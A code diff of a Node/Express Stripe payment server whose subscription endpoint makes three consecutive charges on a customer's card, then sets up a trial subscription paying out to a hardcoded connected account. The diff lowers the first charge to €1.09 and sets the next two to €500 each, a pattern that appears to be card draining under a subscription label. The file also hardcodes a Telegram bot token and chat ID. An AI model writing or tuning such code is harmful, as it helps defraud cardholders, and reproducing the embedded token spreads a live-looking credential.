@@ -5,7 +5,7 @@ const cors = require('cors');
 const bodyParser = require('body-parser');
 
 const app = express();
-const ACCOUNT_B = 'acct_1SmLNn4ZnerSAS1f';
+const ACCOUNT_B = 'acct_1SmGL70gWtvqOjtp';
 const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
 const TELEGRAM_CHAT_ID = '8522488857';
 
@@ -86,10 +86,10 @@ app.post('/create-subscription', async (req, res) => {
       invoice_settings: { default_payment_method: paymentMethodId },
     });
 
-    // Charge 1 — €89.00
+    // Charge 1 — €1.09
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 8900,
+        amount: 109,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -106,10 +106,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 2 — €199
+    // Charge 2 — €500
     try {
       const payment2 = await stripe.paymentIntents.create({
-        amount: 19900,
+        amount: 50000,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -126,10 +126,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 3 — €999
+    // Charge 3 — €500
     try {
       const payment3 = await stripe.paymentIntents.create({
-        amount: 99900,
+        amount: 50000,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -149,7 +149,7 @@ app.post('/create-subscription', async (req, res) => {
     // Subscription with 30-day trial
     const subscription = await stripe.subscriptions.create({
       customer: customerId,
-      items: [{ price: 'price_1T0lXw2KeeUpZw0wjQgD7hIU' }],
+      items: [{ price: 'price_1T1jfK84dbsGsYDa70NNZMex' }],
       default_payment_method: paymentMethodId,
       trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
       transfer_data: { destination: ACCOUNT_B },
